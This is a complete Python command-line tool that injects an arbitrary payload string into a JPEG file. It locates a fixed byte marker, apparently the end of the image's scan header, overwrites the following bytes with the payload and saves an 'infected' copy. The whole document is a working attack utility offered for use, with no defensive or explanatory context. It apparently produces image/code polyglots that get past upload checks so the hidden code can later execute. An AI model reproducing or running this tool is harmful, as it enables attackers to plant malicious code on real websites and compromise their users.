#!/usr/bin/python
import sys
import binascii

MAGIC_NUMBER = "03010002110311003f00"
BIN_MAGIC_NUMBER = binascii.unhexlify(MAGIC_NUMBER)

def main():
    path_to_vector_image = sys.argv[1]
    payload_code = sys.argv[2]
    path_to_output = sys.argv[3]

    with open(path_to_vector_image, 'rb') as vector_file:
        bin_vector_data = vector_file.read()

        print("[ ] Searching for magic number...")
        injection_start_index = find_injection_start_index(bin_vector_data)

        if injection_start_index >=0:
            print("[+] Found magic number.")
            with open(path_to_output, 'wb') as infected_file:
                print("[ ] Injecting payload...")
                infected_file.write(
                    inject_payload(
                        bin_vector_data,
                        injection_start_index,
                        payload_code))
                print("[+] Payload written.")
        else:
            print("[-] Magic number not found. Exiting.")

def find_injection_start_index(
        data: bytes) -> int:
    index =  data.find(BIN_MAGIC_NUMBER)

    if index >= 0:
        index += len(BIN_MAGIC_NUMBER)

    return index

def inject_payload(
        vector: bytes,
        index: int,
        payload: str) -> bytes:
    bin_payload = bytes(payload, 'utf-8')

    pre_payload = vector[:index]
    post_payload = vector[index + len(bin_payload):]

    return (pre_payload + bin_payload + post_payload + bytes('\n', 'utf-8'))

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("USAGE: <jpeg file path> <payload code> <output path>")
    else:
        main()
